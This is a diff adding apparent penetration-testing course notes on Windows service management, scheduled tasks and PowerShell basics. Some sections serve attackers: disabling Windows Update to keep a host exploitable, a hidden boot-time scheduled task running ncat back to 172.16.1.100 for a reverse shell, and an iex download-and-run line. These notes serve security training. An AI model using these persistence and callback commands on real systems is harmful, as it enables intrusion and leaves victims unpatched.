@@ -457,3 +457,810 @@ Variable Name | Description
 %USERPROFILE% | Provides us with the location of the currently active user's home directory. Expands to C:\Users\{username}.
 %ProgramFiles% | Equivalent of C:\Program Files. This location is where all the programs are installed on an x64 based system.
 %ProgramFiles(x86)% | Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture)
+
+
+### Managing Services
+
+#### Service Controller
+
+SC is a Windows executable utility that allows us to query, modify, and manage host services locally and over the network.
+
+```
+C:\htb> sc  
+
+DESCRIPTION:
+        SC is a command line program used for communicating with the
+        Service Control Manager and services.
+USAGE:
+        sc <server> [command] [service name] <option1> <option2>...
+
+
+        The option <server> has the form "\\ServerName"
+        Further help on commands can be obtained by typing: "sc [command]"
+        Commands:
+          query-----------Queries the status for a service, or
+                          enumerates the status for types of services.
+          queryex---------Queries the extended status for a service, or
+                          enumerates the status for types of services.
+          start-----------Starts a service.
+          pause-----------Sends a PAUSE control request to a service.
+
+<SNIP>  
+
+SYNTAX EXAMPLES
+sc query                - Enumerates status for active services & drivers
+sc query eventlog       - Displays status for the eventlog service
+sc queryex eventlog     - Displays extended status for the eventlog service
+sc query type= driver   - Enumerates only active drivers
+sc query type= service  - Enumerates only Win32 services
+sc query state= all     - Enumerates all services & drivers
+sc query bufsize= 50    - Enumerates with a 50 byte buffer
+sc query ri= 14         - Enumerates with resume index = 14
+sc queryex group= ""    - Enumerates active services not in a group
+sc query type= interact - Enumerates all interactive services
+sc query type= driver group= NDIS     - Enumerates all NDIS drivers
+```
+
+> **Note:** The spacing for the optional query parameters is crucial. For example, `type= service`, `type=service`, and `type =service` are completely different ways of spacing this parameter. However, only `type= service` is correct in this case.
+
+```
+C:\htb> sc query type= service
+
+SERVICE_NAME: Appinfo
+DISPLAY_NAME: Application Information
+        TYPE               : 30  WIN32
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+SERVICE_NAME: Audiosrv
+DISPLAY_NAME: Windows Audio
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+SERVICE_NAME: BFE
+DISPLAY_NAME: Base Filtering Engine
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+<SNIP>
+```
+
+* Querying for Windows Defender
+
+```
+C:\htb> sc query windefend
+
+SERVICE_NAME: windefend
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+We can tell that Windows Defender is running and, with our current permission set (the one in which we utilized for the query), does not have permission to stop or pause the service (likely because our user is a standard user and not an administrator). We can test this by trying to stop the service.
+
+#### Stopping and Starting Services
+
+* Stopping an Elevated Service
+
+```
+C:\htb> sc stop windefend
+
+Access is denied.  
+```
+
+Ideally, attempting to stop an elevated service like this is not the best way of testing permissions, as this will likely lead to us getting caught due to the traffic that will be kicked up from running a command like this.
+
+* Stopping an Elevated Service as Administrator
+
+```
+C:\WINDOWS\system32> sc stop windefend
+
+Access is denied.
+```
+
+It seems we still do not have the proper access to stop this service in particular. This is a good lesson for us to learn, as certain processes are protected under stricter access requirements than what local administrator accounts have. In this scenario, the only thing that can stop and start the Defender service is the **SYSTEM** machine account.
+
+Moving on, let's find ourselves a service we can take out as an Administrator. The good news is that we can stop the Print Spooler service.
+
+* Finding the Print Spooler Service
+
+```
+C:\WINDOWS\system32> sc query Spooler
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+* Stopping the Print Spooler Service
+
+```
+C:\WINDOWS\system32> sc stop Spooler
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 3  STOP_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x3
+        WAIT_HINT          : 0x4e20
+
+C:\WINDOWS\system32> sc query Spooler
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+As stated above, we can issue the command sc stop Spooler to have Windows issue a STOP control request to the service. It is important to note that not all services will respond to these requests, regardless of our permissions, especially if other running programs and services depend on the service we are attempting to stop.
+
+* Starting the Print Spooler Service
+
+```
+C:\WINDOWS\system32> sc start Spooler
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 34908
+        FLAGS              :
+
+C:\WINDOWS\system32> sc query Spooler
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+#### Modifying Services
+
+Let's go ahead and see if we can modify some services to prevent Windows from updating itself.
+
+* Disabling Windows Updates Using SC
+
+To configure services, we must use the `config` parameter in sc. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (**SCM**). Remember that all changes to existing services will only fully update after restarting the service.
+
+Unfortunately, the Windows Update feature (Version 10 and above) does not just rely on one service to perform its functionality. Windows updates rely on the following services:
+Service | Display Name
+------- | ------------
+wuauserv | Windows Update Service
+bits | Background Intelligent Transfer Service
+
+> Important: The scenario below requires access to a privileged account. Making updates to services will typically require a set of higher permissions than a regular user will have access to.
+
+* Checking the State of the Required Services
+
+```
+C:\WINDOWS\system32> sc query wuauserv
+
+SERVICE_NAME: wuauserv
+        TYPE               : 30  WIN32
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\WINDOWS\system32> sc query bits
+
+SERVICE_NAME: bits
+        TYPE               : 30  WIN32
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+From the information provided above, we can see that the `wuauserv` service is not currently active as the system is not currently in the process of updating. However, the `bits` service (required to download updates) is currently running on our system. We can issue a stop to this service using our knowledge from the prior section by doing the following:
+
+* Stopping BITS
+
+```
+C:\WINDOWS\system32> sc stop bits
+
+SERVICE_NAME: bits
+        TYPE               : 30  WIN32
+        STATE              : 3  STOP_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0x0
+```
+
+After ensuring that both services are currently stopped, we can modify the **start type** of both services.
+
+* Disabling Windows Update Service
+```
+C:\WINDOWS\system32> sc config wuauserv start= disabled
+
+[SC] ChangeServiceConfig SUCCESS
+```
+
+* Disabling Background Intelligent Transfer Service
+```
+C:\WINDOWS\system32> sc config bits start= disabled
+
+[SC] ChangeServiceConfig SUCCESS
+```
+
+We can see the confirmation that both services have been modified successfully. This means that when both services attempt to start, they will be unable to as they are currently disabled. As previously mentioned, this change will persist upon reboot, meaning that when the system attempts to check for updates or update itself, it cannot do so because both services will remain disabled. We can verify that both services are indeed disabled by attempting to start them.
+
+* Verifying Services are Disabled
+
+```
+C:\WINDOWS\system32> sc start wuauserv 
+
+[SC] StartService FAILED 1058:
+
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+
+C:\WINDOWS\system32> sc start bits
+
+[SC] StartService FAILED 1058:
+
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+```
+
+> Note: To revert everything back to normal, you can set `start= auto` to make sure that the services can be restarted and function appropriately.
+
+We have verified that both services are now disabled, as we cannot start them manually. Due to the changes made here, Windows cannot utilize its updating feature to provide any system or security updates. This can be very beneficial to an attacker to ensure that a system can remain out of date and not retrieve any updates that would inhibit the usage of certain exploits on a target system. Be aware that by doing this in this manner, we will likely be triggering alerts for this sort of action set up by the resident blue team. This method is not quiet and does require elevated permissions in a lot of cases to perform.
+
+#### Other Routes to Query Services
+
+* Using Tasklist
+
+Tasklist is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the `/svc` parameter to provide a list of services running under each process on the system.
+```
+C:\htb> tasklist /svc
+
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+Registry                       108 N/A
+smss.exe                       412 N/A
+csrss.exe                      612 N/A
+wininit.exe                    684 N/A
+csrss.exe                      708 N/A
+services.exe                   768 N/A
+lsass.exe                      796 KeyIso, SamSs, VaultSvc
+winlogon.exe                   856 N/A
+svchost.exe                    984 BrokerInfrastructure, DcomLaunch, PlugPlay,
+                                   Power, SystemEventsBroker
+fontdrvhost.exe               1012 N/A
+fontdrvhost.exe               1020 N/A
+svchost.exe                    616 RpcEptMapper, RpcSs
+svchost.exe                    996 LSM
+dwm.exe                       1068 N/A
+svchost.exe                   1236 CoreMessagingRegistrar
+svchost.exe                   1244 lmhosts
+svchost.exe                   1324 NcbService
+svchost.exe                   1332 TimeBrokerSvc
+svchost.exe                   1352 Schedule
+<SNIP>
+```
+
+* Using Net Start
+
+**Net start** is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to `net start`, there is also `net stop`, `net pause`, and `net continue`. These will behave very similarly to `sc` as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.
+```
+C:\htb> net start
+
+These Windows services are started:
+
+   Application Information
+   AppX Deployment Service (AppXSVC)
+   AVCTP service
+   Background Tasks Infrastructure Service
+   Base Filtering Engine
+   BcastDVRUserService_3321a
+   Capability Access Manager Service
+   cbdhsvc_3321a
+   CDPUserSvc_3321a
+   Client License Service (ClipSVC)
+   CNG Key Isolation
+   COM+ Event System
+   COM+ System Application
+   Connected Devices Platform Service
+   Connected User Experiences and Telemetry
+   CoreMessaging
+   Credential Manager
+   Cryptographic Services
+   Data Usage
+   DCOM Server Process Launcher
+   Delivery Optimization
+   Device Association Service
+   DHCP Client
+   <SNIP>
+```
+
+* Using WMIC
+
+The Windows Management Instrumentation Command (`WMIC`) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information. However, we will only be going over a very small subset of the functionality provided by the `SERVICE` component residing inside this application.
+```
+C:\htb> wmic service list brief
+
+ExitCode  Name                                      ProcessId  StartMode  State    Status
+1077      AJRouter                                  0          Manual     Stopped  OK
+1077      ALG                                       0          Manual     Stopped  OK
+1077      AppIDSvc                                  0          Manual     Stopped  OK
+0         Appinfo                                   5016       Manual     Running  OK
+1077      AppMgmt                                   0          Manual     Stopped  OK
+1077      AppReadiness                              0          Manual     Stopped  OK
+1077      AppVClient                                0          Disabled   Stopped  OK
+0         AppXSvc                                   9996       Manual     Running  OK
+1077      AssignedAccessManagerSvc                  0          Manual     Stopped  OK
+0         AudioEndpointBuilder                      2076       Auto       Running  OK
+0         Audiosrv                                  2332       Auto       Running  OK
+1077      autotimesvc                               0          Manual     Stopped  OK
+1077      AxInstSV                                  0          Manual     Stopped  OK
+1077      BDESVC                                    0          Manual     Stopped  OK
+0         BFE                                       2696       Auto       Running  OK
+0         BITS                                      0          Manual     Stopped  OK
+0         BrokerInfrastructure                      984        Auto       Running  OK
+1077      BTAGService                               0          Manual     Stopped  OK
+0         BthAvctpSvc                               4448       Manual     Running  OK
+1077      bthserv                                   0          Manual     Stopped  OK
+0         camsvc                                    5676       Manual     Running  OK
+0         CDPSvc                                    4724       Auto       Running  OK
+1077      CertPropSvc                               0          Manual     Stopped  OK
+0         ClipSVC                                   9156       Manual     Running  OK
+1077      cloudidsvc                                0          Manual     Stopped  OK
+0         COMSysApp                                 3668       Manual     Running  OK
+0         CoreMessagingRegistrar                    1236       Auto       Running  OK
+0         CryptSvc                                  2844       Auto       Running  OK
+<SNIP>
+```
+
+> Note: It is important to be aware that the WMIC command-line utility is currently deprecated as of the current Windows version. As such, it is advised against relying upon using the utility in most situations.
+
+#### Working With Scheduled Tasks
+
+* Display Scheduled Tasks: Query Syntax
+
+| Action | Parameter | Description
+| ------ | ---------  | -----------
+| Query | | Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.
+|  | /fo | Sets formatting options. We can specify to show results in the Table, List, or CSV output.
+|  | /v | Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.
+|  | /nh | Simplifies the output using the Table or CSV output format. This switch removes the column headers.
+|  | /s | Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\host".
+|  | /u | This switch will tell schtasks to run the following command with the permission set of the user specified.
+|  | /p | Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter.
+
+We can view the tasks that already exist on our host by utilizing the schtasks command like so:
+```
+C:\htb> SCHTASKS /Query /V /FO list
+
+Folder: \  
+HostName:                             DESKTOP-Victim
+TaskName:                             \Check Network Access
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive only
+Last Run Time:                        11/30/1999 12:00:00 AM
+Last Result:                          267011
+Author:                               DESKTOP-Victim\htb-admin
+Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
+Start In:                             N/A
+Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          tru7h
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+
+<SNIP>
+```
+
+* Create a New Scheduled Task: Create Syntax
+
+| Action | Parameter | Description
+| ------ | --------- | -----------
+| Create | | Schedules a task to run.
+| | /sc | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.
+| | /tn | Sets the name for the task we are building. Each task must have a unique name.
+| | /tr | Sets the trigger and task that should be run. This can be an executable, script, or batch file.
+| | /s | Specify the host to run on, much like in Query.
+| | /u | Specifies the local user or domain user to utilize
+| | /p | Sets the Password of the user-specified.
+| | /mo | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.
+| | /rl | Allows us to limit the privileges of the task. Options here are limited access and Highest. Limited is the default value.
+| | /z | Will set the task to be deleted after completion of its actions.
+
+
+At a minimum, we must specify the following:
+
+* `/create`: to tell it what we are doing
+* `/sc`: we must set a schedule
+* `/tn`: we must set the name
+* `/tr`: we must give it an action to take
+
+```
+C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
+
+SUCCESS: The scheduled task "My Secret Task" has successfully been created.
+```
+
+> A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.
+
+* Change the Properties of a Scheduled Task: Change Syntax
+
+| Action | Parameter | Description
+| ----- | ----- | -----
+| Change | | Allows for modifying existing scheduled tasks.
+| | /tn | Designates the task to change
+| | /tr | Modifies the program or action that the task runs.
+| | /ENABLE | Change the state of the task to Enabled.
+| | /DISABLE | Change the state of the task to Disabled.
+
+Ok, now let us say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.
+```
+C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
+
+SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
+```
+
+```
+C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 
+
+Folder: \
+HostName:                             DESKTOP-Victim
+TaskName:                             \My Secret Task
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        11/30/1999 12:00:00 AM
+Last Result:                          267011
+Author:                               DESKTOP-victim\htb-admin
+Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+
+<SNIP>  
+```
+
+* Delete the Scheduled Task(s): Delete Syntax
+
+| Action | Parameter | Description
+| ------ | --------- | -----------
+| Delete | | Remove a task from the schedule
+| | /tn | Identifies the task to delete.
+| | /s | Specifies the name or IP address to delete the task from.
+| | /u | Specifies the user to run the task as.
+| | /p | Specifies the password to run the task as.
+| | /f | Stops the confirmation warning.
+
+```
+C:\htb> schtasks /delete  /tn "My Secret Task" 
+
+WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
+```
+
+Running `schtasks /delete` is simple enough. The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. Using `/F` will delete the task and suppress the message.
+
+
+## PowerShell
+
+Feature | CMD | PowerShell
+------- | --- | ----------
+Language | Batch and basic CMD commands only. | PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.
+Command utilization | The output from one command cannot be passed into another directly as a structured object, due to the limitation of handling the text output. | The output from one command can be passed into another directly as a structured object resulting in more sophisticated commands.
+Command Output | Text only. | PowerShell outputs in object formatting.
+Parallel Execution | CMD must finish one command before running another. | PowerShell can multi-thread commands to run in parallel.
+
+From a stealth perspective, PowerShell's logging and history capability is powerful and will log more of our interactions with the host. So if we do not need PowerShell's capabilities and wish to be more stealthy, we should utilize CMD.
+
+* Using Get-Help
+
+```
+PS C:\Users\htb-student> Get-Help Test-Wsman
+```
+
+* Using Update-Help to have most up-to-date information
+```
+PS C:\Windows\system32> Update-Help
+```
+
+* `pwd` of PowerShell
+```
+PS C:\Users\DLarusso> Get-Location
+
+Path
+----
+C:\Users\DLarusso
+```
+
+* Listing the Directory
+
+```
+PS C:\htb> Get-ChildItem 
+
+Directory: C:\Users\DLarusso
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/26/2021  10:26 PM                .ssh
+d-----         1/28/2021   7:05 PM                .vscode
+d-r---         1/27/2021   2:44 PM                3D Objects
+d-r---         1/27/2021   2:44 PM                Contacts
+d-r---         9/18/2022  12:35 PM                Desktop
+d-r---         9/18/2022   1:01 PM                Documents
+d-r---         9/26/2022  12:27 PM                Downloads
+d-r---         1/27/2021   2:44 PM                Favorites
+d-r---         1/27/2021   2:44 PM                Music
+dar--l         9/26/2022  12:03 PM                OneDrive
+d-r---         5/22/2022   2:00 PM                Pictures
+```
+
+* Move to a new directory
+
+```
+PS C:\htb>  Set-Location .\Documents\
+
+PS C:\Users\tru7h\Documents> Get-Location
+
+Path
+----
+C:\Users\DLarusso\Documents
+```
+
+* Display contents of a file
+
+```
+PS C:\htb> Get-Content Readme.md  
+
+# ![logo][] PowerShell
+
+Welcome to the PowerShell GitHub Community!
+PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized
+for dealing with structured data (e.g., JSON, CSV, XML, etc.), REST APIs, and object models.
+It includes a command-line shell, an associated scripting language and a framework for processing cmdlets. 
+
+<SNIP> 
+```
+
+* Get-Command
+
+Get-Command is a great way to find a pesky command that might be slipping from our memory right when we need to use it. With PowerShell using the verb-noun convention for cmdlets, we can search on either.
+```
+PS C:\htb> Get-Command
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           Add-AppPackage                                     2.0.1.0    Appx
+Alias           Add-AppPackageVolume                               2.0.1.0    Appx
+Alias           Add-AppProvisionedPackage                          3.0        Dism
+Alias           Add-ProvisionedAppPackage                          3.0        Dism
+Alias           Add-ProvisionedAppxPackage                         3.0        Dism
+Alias           Add-ProvisioningPackage                            3.0        Provisioning
+Alias           Add-TrustedProvisioningCertificate                 3.0        Provisioning
+Alias           Apply-WindowsUnattend                              3.0        Dism
+Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
+Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
+Alias           Dismount-AppPackageVolume                          2.0.1.0    Appx
+Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
+Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
+Alias           Flush-Volume                                       2.0.0.0    Storage
+Alias           Get-AppPackage                                     2.0.1.0    Appx
+
+<SNIP>  
+```
+
+```
+PS C:\htb> Get-Command -verb get
+
+<SNIP>
+Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.Pow...
+Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.Pow...
+Cmdlet          Get-AppLockerFileInformation                       2.0.0.0    AppLocker
+Cmdlet          Get-AppLockerPolicy                                2.0.0.0    AppLocker
+Cmdlet          Get-AppvClientApplication                          1.0.0.0    AppvClient  
+<SNIP>  
+```
+
+Using the `-verb` modifier and looking for any cmdlet, alias, or function with the term get in the name, we are provided with a detailed list of everything PowerShell is currently aware of. We can also perform the exact search using the filter `get*` instead of the `-verb` `get`. The Get-Command cmdlet recognizes the `*` as a wildcard and shows each variant of `get`(anything). We can do something similar by searching on the noun as well.
+
+```
+PS C:\htb> Get-Command -noun windows*  
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           Apply-WindowsUnattend                              3.0        Dism
+Function        Get-WindowsUpdateLog                               1.0.0.0    WindowsUpdate
+Cmdlet          Add-WindowsCapability                              3.0        Dism
+Cmdlet          Add-WindowsDriver                                  3.0        Dism
+Cmdlet          Add-WindowsImage                                   3.0        Dism
+Cmdlet          Add-WindowsPackage                                 3.0        Dism
+Cmdlet          Clear-WindowsCorruptMountPoint                     3.0        Dism
+Cmdlet          Disable-WindowsErrorReporting                      1.0        WindowsErrorR...
+Cmdlet          Disable-WindowsOptionalFeature                     3.0        Dism
+Cmdlet          Dismount-WindowsImage                              3.0        Dism
+Cmdlet          Enable-WindowsErrorReporting                       1.0        WindowsErrorR...
+Cmdlet          Enable-WindowsOptionalFeature                      3.0        Dism
+```
+
+* Get-History
+
+```
+PS C:\htb> Get-History
+
+ Id CommandLine
+  -- -----------
+   1 Get-Command
+   2 clear
+   3 get-command -verb set
+   4 get-command set*
+   5 clear
+   6 get-command -verb get
+   7 get-command -noun windows
+   8 get-command -noun windows*
+   9 get-module
+  10 clear
+  11 get-history
+  12 clear
+  13 ipconfig /all
+  14 arp -a
+  15 get-help
+  16 get-help get-module
+```
+
+By default, `Get-History` will only show the commands that have been run during this active session. Notice how the commands are numbered; we can recall those commands by using the alias `r` followed by the number to run that command again. For example, if we wanted to rerun the `arp -a` command, we could issue `r 14`, and PowerShell will action it. Keep in mind that if we close the shell window, or in the instance of a remote shell through command and control, once we kill that session or process that we are running, our PowerShell history will disappear. With `PSReadLine`, however, that is not the case. `PSReadLine` stores everything in a file called `$($host.Name)_history.txt` located at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine`.
+
+
+* Viewing PSReadLine History
+```
+PS C:\htb> get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+get-module
+Get-ChildItem Env: | ft Key,Value
+Get-ExecutionPolicy
+clear
+ssh administrator@10.172.16.110.55
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"
+Get-ExecutionPolicy
+
+<SNIP>
+```
+
+One feature of `PSReadline` from an admin perspective is that it will automatically attempt to filter any entries that include the strings:
+
+*   `password`
+*   `asplaintext`
+*   `token`
+*   `apikey`
+*   `secret`
+
+The built-in session history does not do this.
+
+* Hotkeys
+
+HotKey | Description
+------ | -----------
+CTRL+R | It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.
+CTRL+L | Quick screen clear.
+CTRL+ALT+Shift+? | This will print the entire list of keyboard shortcuts PowerShell will recognize.
+Escape | When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit escape, which will erase the line.
+↑ | Scroll up through our previous history.
+↓ | Scroll down through our previous history.
+F7 | Brings up a TUI with a scrollable interactive history from our session.
+
+* Aliases
+
+Our last tip to mention is `Aliases`. A PowerShell alias is another name for a cmdlet, command, or executable file. We can see a list of default aliases using the [Get-Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-7.2) cmdlet. Most built-in aliases are shortened versions of the cmdlet, making it easier to remember and quick to use.
+```
+PS C:\Windows\system32> Get-Alias
+
+CommandType     Name
+-----------     ----
+Alias           % -> ForEach-Object
+Alias           ? -> Where-Object
+Alias           ac -> Add-Content
+Alias           asnp -> Add-PSSnapin
+Alias           cat -> Get-Content
+Alias           cd -> Set-Location
+Alias           CFS -> ConvertFrom-String
+Alias           chdir -> Set-Location
+Alias           clc -> Clear-Content
+Alias           clear -> Clear-Host
+Alias           clhy -> Clear-History
+Alias           cli -> Clear-Item
+Alias           clp -> Clear-ItemProperty
+Alias           cls -> Clear-Host
+Alias           clv -> Clear-Variable
+Alias           cnsn -> Connect-PSSession
+Alias           compare -> Compare-Object
+Alias           copy -> Copy-Item
+Alias           cp -> Copy-Item
+Alias           cpi -> Copy-Item
+Alias           cpp -> Copy-ItemProperty
+Alias           curl -> Invoke-WebRequest
+Alias           cvpa -> Convert-Path
+Alias           dbp -> Disable-PSBreakpoint
+Alias           del -> Remove-Item
+Alias           diff -> Compare-Object
+Alias           dir -> Get-ChildItem
+
+<SNIP>
+```
+
+* Using Set-Alias
+```
+PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
+```
+
+* Helpful Aliases
+
+Alias | Description
+----- | -----------
+pwd | gl can also be used. This alias can be used in place of Get-Location.
+ls | dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.
+cd | sl and chdir can be used in place of cd. This is an alias for Set-Location.
+cat | type and gc can also be used. This is an alias for Get-Content.
+clear | Can be used in place of Clear-Host.
+curl | Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.
+fl and ft | These aliases can be used to format output into list and table outputs.
+man | Can be used in place of help.
